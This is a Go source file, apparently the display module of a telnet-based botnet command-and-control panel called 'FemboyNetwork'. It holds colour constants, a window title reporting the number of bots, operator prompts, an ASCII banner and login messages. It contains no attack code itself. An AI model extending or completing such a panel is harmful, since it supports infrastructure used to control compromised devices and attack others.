package main

import (
	"fmt"
	"io"
)

type Render struct {
	w io.Writer
}

func NewRender(w io.Writer) *Render {
	return &Render{w}
}

// Theme colors — менять в одном месте
const (
	CReset   = "\033[0m"
	CBold    = "\033[1m"
	CCls     = "\033[2J\033[1H"
	CAltOn   = "\033[?1049h"
	CAltOff  = "\033[?1049l"
	CLineClr = "\r\033[K"

	CTelnet = "\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"

	CPink   = "\033[38;5;200m"
	CPurple = "\033[38;5;53m"
	CLight  = "\033[38;5;219m"
	CGray   = "\033[38;5;90m"
	CWhite  = "\033[97m"
	CWhiteB = "\033[1;97m"
	CRed    = "\033[31m"
	CYellow = "\033[33m"
	CCyan   = "\033[36m"
	CGreen  = "\033[38;5;84m"
)

func (r *Render) S(format string, args ...interface{}) string {
	return fmt.Sprintf(format, args...)
}

func (r *Render) Write(s string) {
	r.w.Write([]byte(s))
}

func (r *Render) Writef(format string, args ...interface{}) {
	r.Write(r.S(format, args...))
}

func (r *Render) Writeln(s string) {
	r.Write(s + "\r\n")
}

func (r *Render) Clear() {
	r.Write(CCls)
}

func (r *Render) AltOn() {
	r.Write(CAltOn)
}

func (r *Render) AltOff() {
	r.Write(CAltOff)
}

func (r *Render) Title(botCount int, username string) string {
	return fmt.Sprintf("\033]0;%d bots | FemboyNetwork | %s\007", botCount, username)
}

func (r *Render) Prompt() {
	r.Write(CPink + "[" + CLight + "Femboy" + CGray + "Network" + CPink + "]" + CWhite + " > ")
}

func (r *Render) PromptUser(user string) {
	r.Write(CPink + user + CGray + "@" + CLight + "fnbnet" + CGray + " : " + CWhite + "> ")
}

func (r *Render) PromptWithCount(user string, count int) {
	r.Write(CPink + user + CGray + "@" + CLight + "fnbnet" + CGray + " [" + CWhite + fmt.Sprintf("%d", count) + CGray + "] : " + CWhite + "> ")
}

// Col — обёртка строки в цвет
func Col(color, s string) string {
	return color + s + CReset
}

func (r *Render) P(s string)  { r.Write(CPink + s + CReset) }
func (r *Render) Pu(s string) { r.Write(CPurple + s + CReset) }
func (r *Render) L(s string)  { r.Write(CLight + s + CReset) }
func (r *Render) G(s string)  { r.Write(CGray + s + CReset) }
func (r *Render) W(s string)  { r.Write(CWhite + s + CReset) }
func (r *Render) Wb(s string) { r.Write(CWhiteB + s + CReset) }
func (r *Render) Red(s string)  { r.Write(CRed + s + CReset) }

func (r *Render) Pf(color, format string, args ...interface{}) {
	r.Write(color + r.S(format, args...) + CReset)
}

// Box helpers
func (r *Render) BoxTop(width int) {
	r.Write(CPink + " ╔")
	for i := 0; i < width; i++ {
		r.Write("═")
	}
	r.Write("╗\r\n" + CReset)
}

func (r *Render) BoxMid(width int) {
	r.Write(CPink + " ╠")
	for i := 0; i < width; i++ {
		r.Write("═")
	}
	r.Write("╣\r\n" + CReset)
}

func (r *Render) BoxBot(width int) {
	r.Write(CPink + " ╚")
	for i := 0; i < width; i++ {
		r.Write("═")
	}
	r.Write("╝\r\n" + CReset)
}

func (r *Render) BoxRow(content string) {
	r.P(" ║" + CWhiteB + " " + content + " " + CPink + "║\r\n")
}

func (r *Render) BoxRowf(format string, args ...interface{}) {
	r.BoxRow(r.S(format, args...))
}

// Banner
func (r *Render) Banner() {
	r.Write(CPurple + "  ███████╗███████╗███╗   ███╗██████╗  ██████╗ ██╗   ██╗\r\n")
	r.Write(CPurple + "  ██╔════╝██╔════╝████╗ ████║██╔══██╗██╔═══██╗╚██╗ ██╔╝\r\n")
	r.Write(CPurple + "  █████╗  █████╗  ██╔████╔██║██████╔╝██║   ██║ ╚████╔╝ \r\n")
	r.Write(CPink + "  ██╔══╝  ██╔══╝  ██║╚██╔╝██║██╔══██╗██║   ██║  ╚██╔╝  \r\n")
	r.Write(CPink + "  ██║     ███████╗██║ ╚═╝ ██║██████╔╝╚██████╔╝   ██║   \r\n")
	r.Write(CPink + "  ╚═╝     ╚══════╝╚═╝     ╚═╝╚═════╝  ╚═════╝    ╚═╝   \r\n")
	r.Write("\r\n")
	r.Write(CLight + "  ███╗   ██╗███████╗████████╗██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗\r\n")
	r.Write(CLight + "  ████╗  ██║██╔════╝╚══██╔══╝██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝\r\n")
	r.Write(CLight + "  ██╔██╗ ██║█████╗     ██║   ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ \r\n")
	r.Write(CLight + "  ██║╚██╗██║██╔══╝     ██║   ██║███╗██║██║   ██║██╔══██╗██╔═██╗ \r\n")
	r.Write(CLight + "  ██║ ╚████║███████╗   ██║   ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗\r\n")
	r.Write(CLight + "  ╚═╝  ╚═══╝╚══════╝   ╚═╝    ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝\r\n")
	r.Write("\r\n")
	r.P("               by c0redev (unitdev.run)\r\n\r\n")
}

// Login prompt
func (r *Render) LoginPrompt() {
	r.Write(CPink + " \r\n")
	r.Write(CLight + "username" + CGray + ": " + CReset)
}

func (r *Render) PassPrompt() {
	r.Write(CLight + "password" + CGray + ": " + CReset)
}

func (r *Render) LoginFail() {
	r.Writeln(CRed + "Check your login Info")
	r.Writeln(CPink + "Subby if this is you dont even try")
}
